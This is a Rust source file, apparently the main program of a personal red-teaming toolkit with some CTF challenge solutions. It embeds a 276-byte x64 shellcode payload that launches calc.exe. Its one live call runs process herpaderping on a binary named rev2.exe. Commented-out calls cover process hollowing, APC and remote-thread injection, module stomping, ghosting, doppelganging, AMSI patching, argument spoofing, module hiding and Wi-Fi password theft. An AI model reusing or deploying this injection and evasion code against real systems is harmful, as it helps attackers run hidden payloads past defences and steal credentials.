#![allow(warnings)]

mod injections;
mod windows_services;



use injections::computer;
use injections::injector;
use winapi::shared::minwindef::HINSTANCE__;
use winapi::shared::windef::HFILE_ERROR;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::LOAD_LIBRARY_AS_IMAGE_RESOURCE;
use winapi::um::libloaderapi::LoadLibraryExA;
use winapi::um::libloaderapi::LoadResource;
use winapi::um::libloaderapi::SizeofResource;
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::*;
use winapi::um::minwinbase::*;
use winapi::um::winbase::*;
use winapi::um::winnt::*;
use winapi::um::errhandlingapi::*;
use winapi::ctypes::*;
use winapi::um::winuser::*;

use injections::winenum;
use std::env;
use std::f32::INFINITY;
use winapi::ctypes::*;
use winapi::um::handleapi::*;
use winapi::um::memoryapi::*;
use winapi::um::errhandlingapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::synchapi::*;
use winapi::um::winbase::CREATE_NEW_CONSOLE;
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::*;


mod peparser64;



pub fn execute_binary(path: String) -> String{

    use std::process::Command;

    //let precmd = "C:\\Windows\\System32\\cmd.exe";
    //let args1 = "/c ".to_string() + &path;
    let res = Command::new(path) .output().expect("failed to run the binary");
    if res.stdout.len()>0{
        return String::from_utf8_lossy(&res.stdout).to_string();
    }

    else{
        return String::from_utf8_lossy(&res.stderr).to_string();
    }

}



use std::thread;
use std::time::Duration;

#[allow(dead_code)]
#[allow(unused_variables)]


fn main() {
    
    unsafe{
        
        /*let procs = winenum::getprocesses().unwrap();
        println!("{:?}",procs);
        println!("{}",procs.len());*/

        /*let mut payload:[u8;1] = [0x90];
        let isdebug = winenum::isbeingdebugged(GetCurrentProcess());
        println!("isbeingdebugged: {}",isdebug.unwrap());

        let modules = winenum::getloadedmodules(GetCurrentProcess()).unwrap();
        println!("Loaded modules: {:x?}",modules);

        let imagepathname = winenum::getprocessimagepath(GetCurrentProcess()).unwrap();
        println!("Image PathName: {}",imagepathname);

        let params = winenum::getprocessparameters(GetCurrentProcess()).unwrap();
        println!("Parameters: {}",params);*/


        // CHALLENGE 20
        /*let arguments = env::args().collect::<Vec<String>>();

        if arguments.len()!=2{
            println!("Sorry try again");
            std::process::exit(0);
        }*/

        //let res =winenum::setclipboarddata(arguments[1].to_string());
        
        //let clipdata = winenum::getclipboarddata();
        //println!("{}",clipdata.unwrap());

       
        //execute_binary(arguments[1].to_string());

        #[no_mangle]
        let mut payload: [u8;276] = [
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00 ];

        /*let procs = winenum::getprocesses().unwrap();
        let mut pid= 0;
        for i in procs.keys(){
            if i.to_lowercase()=="chal28.exe"{
                pid = procs[i];

                let prochandle = OpenProcess(PROCESS_ALL_ACCESS,0 , pid);
        
                TerminateProcess(prochandle, 0);

            }
        }*/


        /* * AMSI PATCH CHALLENGE
        let currentpath = env::current_dir().unwrap();
        let curdir = currentpath.into_os_string().into_string().unwrap();
        let fullpath = curdir + "\\chal28.exe\0";
        //println!("fullpath: {}",fullpath);

        let arguments = env::args().collect::<Vec<String>>();

        if arguments.len()!=2{
            println!("Sorry try again");
            std::process::exit(0);
        }

        let procs = winenum::getprocesses().unwrap();
        let mut pid2 = 0;
        
        for i in procs.keys(){
            if i.to_lowercase().contains("chal28.exe"){
                //ischal28exists = 1;
                pid2 = procs[i];
                let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid2);
                TerminateProcess(prochandle, 0);
                CloseHandle(prochandle);
                
                //execute_binary(fullpath.clone());
    
                /*let mut si = std::mem::zeroed::<STARTUPINFOA>();
                si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    
                let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

                let res = CreateProcessA(fullpath.as_bytes().as_ptr() as *const i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

                if res==0{
                    println!("CreateProcessA failed: {}",GetLastError());
                    std::process::exit(0);
                }*/

                
                break;
            }
        }

        
            
        let mut si = std::mem::zeroed::<STARTUPINFOA>();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    
        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();
                    
        let res = CreateProcessA(fullpath.as_bytes().as_ptr() as *const i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

        if res==0{
            println!("CreateProcessA failed: {}",GetLastError());
            std::process::exit(0);
        }

        let modules = winenum::getloadedmodules(pi.hProcess).unwrap();
        for i in modules.keys(){
            if i.to_lowercase() == "amsi.dll"{
                
                let pe =  peparser64::pememoryparser64::parse(pi.hProcess, modules[i] as *mut c_void).unwrap();
                let exports = pe.getexports().unwrap();
                for j in exports.keys(){
                    if j.to_lowercase()=="amsiscanbuffer"{

                            

                    }
                }
                


            }
        }
        */

        // winenum::getwifipasswords();
        //injector::process_inject(&mut payload);

        #[no_mangle]
    pub fn test(){
        for i in 0..3{
            unsafe{
                SleepEx(3000,1);
            }
            println!("i am from inside test function");
            
        }
        
            /*unsafe{
                    MessageBoxA(std::ptr::null_mut(), 
                    "hi\0".as_bytes().as_ptr() as *const i8, 
                    "hi\0".as_bytes().as_ptr() as *const i8, 0);


                }*/
            }

        //injector::process_inject_apc_test(std::mem::transmute::<fn(),*const c_void>(test));
        
        /*let procs = winenum::getprocesses().unwrap();
        for i in procs.keys(){
            if i == "Notepad.exe"{
               //injector::process_inject_sectionmapping(&mut payload, procs[i]);
                //injector::module_stomping(&mut payload, procs[i]);
            }
        }*/

        injector::process_inject_herpadering("D:\\red teaming tools\\rev2.exe\0".to_string(),
        "D:\\red teaming tools".to_string());
       // injector::process_inject_doppelganging("D:\\red teaming tools\\calc2.exe\0".to_string(),
       //     "D:\\red teaming tools".to_string());
        //injector::process_inject_ghosting("D:\\red teaming tools\\calc2.exe\0".to_string(),
       //     "D:\\red teaming tools".to_string());
        //injector::process_inject_doppelganging("D:\\red teaming tools\\calc2.exe\0".to_string());
        //injector::process_inject_hollowing(&mut payload);

        //injector::process_inject_earlybird(&mut payload);
        //thread::sleep(Duration::from_secs(4));


        /* CHALLENGE 28 SOLUTION
        let prochandle = OpenProcess(PROCESS_ALL_ACCESS,0 , pid);
        
        //println!("{:x?}",prochandle); 
        let mut baseaddress = 0 as *mut c_void;
 
        injector::amsi_patch(prochandle);

        CloseHandle(prochandle);*/


        //let pe = peparser64::pememoryparser64::parse(GetCurrentProcess(), GetCurrentProcess()).unwrap();
        //println!("{:x?}",pe.getdosheader().unwrap());

        //injector::shellcode_inject_remotethread(&payload);

        /*println!("Enter anything to continue");
        let mut userinput = String::new();
        std::io::stdin().read_line(&mut userinput);*/






        /* CHALLENGE 25 SOLUTION
        let procs = winenum::getprocesses().unwrap();
        let mut pid = 0;
        for i in procs.keys(){
            if i.contains("Notepad.exe"){
                pid = procs[i];
            }
        }

        let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        winenum::hideloadedmodule(prochandle, "kernel32.dll".to_string());
        
        CloseHandle(prochandle);*/


        /*   CHALLENGE 25
        let currentpath = env::current_dir().unwrap();
        let curdir = currentpath.into_os_string().into_string().unwrap();
        let fullpath = curdir + "\\chal25.exe\0";
        //println!("fullpath: {}",fullpath);

        let arguments = env::args().collect::<Vec<String>>();

        if arguments.len()!=2{
            println!("Sorry try again");
            std::process::exit(0);
        }

        let procs = winenum::getprocesses().unwrap();
        let mut pid2 = 0;
        let mut ischal25exists = 0;
        for i in procs.keys(){
            if i.to_lowercase().contains("chal25.exe"){
                ischal25exists = 1;
                pid2 = procs[i];
                let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid2);
                TerminateProcess(prochandle, 0);
                CloseHandle(prochandle);
                
                //execute_binary(fullpath.clone());
    
                let mut si = std::mem::zeroed::<STARTUPINFOA>();
                si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    
                let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

                let res = CreateProcessA(fullpath.as_bytes().as_ptr() as *const i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

                if res==0{
                    println!("CreateProcessA failed: {}",GetLastError());
                    std::process::exit(0);
                }

                
                break;
            }
        }

        if ischal25exists==0{
            
            let mut si = std::mem::zeroed::<STARTUPINFOA>();
                si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    
                let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();
                    
                let res = CreateProcessA(fullpath.as_bytes().as_ptr() as *const i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

                if res==0{
                    println!("CreateProcessA failed: {}",GetLastError());
                    std::process::exit(0);
                }

        }

        //thread::sleep(Duration::from_secs(10));


        
        execute_binary(arguments[1].to_string());

        
        //execute_binary(arguments[1].to_string());

        //thread::sleep(Duration::from_secs(1));
        

        let procs = winenum::getprocesses().unwrap();
        //println!("{:?}",procs);
        let mut pid = 0;
        for i in procs.keys(){
            if i.contains("chal25"){
                pid = procs[i];
            }
        }

        if pid==0{
            println!("sorry no chal25.exe process is running");
            std::process::exit(0);
        }

        let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            
        if !prochandle.is_null(){
                //let res =winenum::getenvironmentvariables(prochandle);
        
               //let modules = winenum::hideloadedmodule(prochandle,
                //    "Kernel32.dll".to_string()).unwrap();
                //println!("{:x?}",modules);
                //let modules = winenum::hideloadedmodule(prochandle,
                //"toolkit.exe".to_string()).unwrap();
        
            let allmods =winenum::getloadedmodules(prochandle).unwrap();
            //println!("{:x?}",allmods);
            for i in allmods.keys(){
                    if i.to_lowercase()=="kernel32.dll"{
                        println!("sorry try again");
                        std::process::exit(0);
                    }
                }

            println!("{}","EXE{TREASURE_SUCCESSFULLY_HIDDEN_FROM_CIRCULAR_DOUBLE_LINKEDLIST}");

            }
        CloseHandle(prochandle);
        /*let procs = winenum::getprocesses().unwrap();
        let mut pid2 = 0;
        let mut ischal25exists = 0;
        for i in procs.keys(){
            if i.contains("chal25.exe"){
                
                let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid2);
                TerminateProcess(prochandle, 0);
                CloseHandle(prochandle);
                
                break;
            }
        }*/
        */
        
        

        /* CHALLENGE 25 SOLUTIONLATEST 
        let procs = winenum::getprocesses().unwrap();
        //println!("{:?}",procs);
        let mut pid = 0;
        for i in procs.keys(){
            if i.contains("chal25"){
                pid = procs[i];
            }
        }

        if pid==0{
            println!("sorry no chal25.exe process is running");
            std::process::exit(0);
        }

        let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            
        if !prochandle.is_null(){
                //let res =winenum::getenvironmentvariables(prochandle);
        
               let modules = winenum::hideloadedmodule(prochandle,
                    "Kernel32.dll".to_string()).unwrap();
                //println!("{:x?}",modules);
                //let modules = winenum::hideloadedmodule(prochandle,
                //"toolkit.exe".to_string()).unwrap();
        
            /*let allmods =winenum::getloadedmodules(prochandle).unwrap();
            //println!("{:x?}",allmods);
            for i in allmods.keys(){
                    if i.to_lowercase()=="kernel32.dll"{
                        println!("sorry try again");
                        std::process::exit(0);
                    }
                }*/

            //println!("{}","EXE{TREASURE_SUCCESSFULLY_HIDDEN_FROM_CIRCULAR_DOUBLE_LINKEDLIST}");

        }
        CloseHandle(prochandle);
        */







        //let allmods =winenum::getloadedmodulesbackward(GetCurrentProcess()).unwrap();
        //println!("{:x?}",allmods);

        //let modules = winenum::getloadedmodules(GetCurrentProcess()).unwrap();
        //println!("{:x?}",modules);

        //let res =winenum::getenvironmentvariables(GetCurrentProcess());

        //winenum::getclipboarddata();

        /*let mut isthere = 0;
        let procs = winenum::getprocesses().unwrap();
        //let applicationname = "D:\\rust_practice\\redteamingtools\\peparser\\target\\release\\peparser.exe".to_string();
        //let applicationname = "C:\\Users\\nagas\\source\\repos\\chal20\\x64\\Release\\chal20.exe".to_string();
        let applicationname = "chal20.exe".to_string();
        let applicationname = applicationname + "\0";
        //  println!("{:?}",procs);
        for i in procs.keys(){
            
            if i.contains("chal20"){

                //execute_binary(arguments[1].to_string());
                //println!("chal20 is there");
                //println!("{}: {}",i,procs[i]);
                let proc1handle = OpenProcess(PROCESS_ALL_ACCESS, 0, procs[i]);
                if !proc1handle.is_null(){
                let params = winenum::getprocessparameters(proc1handle).unwrap();
                println!("before changing Parameters: {}",params);
                

                let res = winenum::writeprocessparameters(proc1handle, "echo 'GIMME_THE_FLAG' > content.txt".to_string());
                //println!("result: {}",res.unwrap());

                let params = winenum::getprocessparameters(proc1handle).unwrap();
                println!("after changing Parameters: {}",params);

                let threadids = winenum::getprocessthreads(procs[i]);
                println!("threadsids: {:?}",threadids);
                for i in threadids{
                    let threadhandle = OpenThread(THREAD_ALL_ACCESS, 0, i);
                    if threadhandle.is_null(){
                        continue;
                    }
                    let res1 = ResumeThread(threadhandle);
                    println!("result of resuming thread: {}",res1);
                }
                CloseHandle(proc1handle);
            
               
                isthere = 1;
                break;
            }
            }
        }*/

        //println!("is there: {}",isthere);

        /*if isthere==0{
            //println!("chal20 is not there");

            let mut namebuffer = applicationname.encode_utf16().collect::<Vec<u16>>();
            namebuffer.push(0);
            //let mut fakecmdline = "AAAAAAA".encode_utf16().collect::<Vec<u16>>();
            //fakecmdline.push(0);

            let mut si = std::mem::zeroed::<STARTUPINFOA>();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

            let mut fakeargs = "echo 'I_AM_A_FAKE_FLAG,REPLACE_ME' > content.txt".to_string() + "\0";
            let res = CreateProcessA(applicationname.as_bytes().as_ptr() as *const i8, 
            fakeargs.as_bytes().as_ptr() as *mut i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE|CREATE_SUSPENDED, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                std::process::exit(0);
            }
            //SuspendThread(pi.hThread);

            //let params= winenum::getprocessparameters(pi.hProcess).unwrap();
            //println!("{}",params);

            execute_binary(arguments[1].to_string());
        
        }*/




        //println!("number of processes: {}",procs.len());
        
        /*let res = injector::spoof_arguments("D:\\rust_practice\\redteamingtools\\peparser\\target\\release\\peparser.exe".to_string(), 
        "-c whoami > C:\\Users\\nagas\\Downloads\\content.txt".to_string(), 
        "-c ls > C:\\Users\\nagas\\Downloads\\content.txt".to_string());*/

        /*let res = injector::spoof_arguments("D:\\rust_practice\\redteamingtools\\peparser\\target\\release\\peparser.exe".to_string(), 
        "AAAAAAAAA".to_string(), 
        "ABC".to_string());*/



        //winenum::isprotectedprocess(GetCurrentProcess());

        //injector::shellcode_inject_self( &payload);

        /*
        let filepath = "C:\\Users\\nagas\\source\\repos\\resource2\\x64\\Release\\resource2.exe\0";

        let mut ofstruct = std::mem::zeroed::<OFSTRUCT>();
        ofstruct.cBytes = std::mem::size_of::<OFSTRUCT>() as u8;

        let filehandle = LoadLibraryExA(filepath.as_bytes().as_ptr() as *const i8, 
        std::ptr::null_mut(), LOAD_LIBRARY_AS_IMAGE_RESOURCE);


        if filehandle.is_null(){
            println!("openfile failed: {}",GetLastError());
            std::process::exit(0);
        }

        let mut results:Vec<String> = Vec::new();

        for i in 100..111{
            let resourcehandle = FindResourceA(filehandle,
                MAKEINTRESOURCEA(i),
                    MAKEINTRESOURCEA(23));

            if resourcehandle.is_null(){
                //println!("findresourceA failed: {}",GetLastError());
                continue;
            }

            let base = LoadResource(filehandle, resourcehandle);

            let ressize = SizeofResource(filehandle, resourcehandle);

            let mut buffer:Vec<u8> = vec![0;ressize as usize];
            let mut bytesread = 0;
            ReadProcessMemory(GetCurrentProcess(), 
            base, buffer.as_mut_ptr() as *mut c_void, 
                ressize as usize, &mut bytesread);

            
        }*/



        /*let threadhandle = GetCurrentThread();
        println!("threadhandle: {:x?},threadhandle);
        let mut context = std::mem::zeroed::<CONTEXT>();
        
        let res = GetThreadContext(threadhandle, &mut context);
        if res==0{
            println!("GetThreadContext failed: {},GetLastError());
            std::process::exit(0);
        }

        println!("contextual flags: {},context.ContextFlags);
        println!("rip value: {:x?},context.Rip);*/
    }
    

}
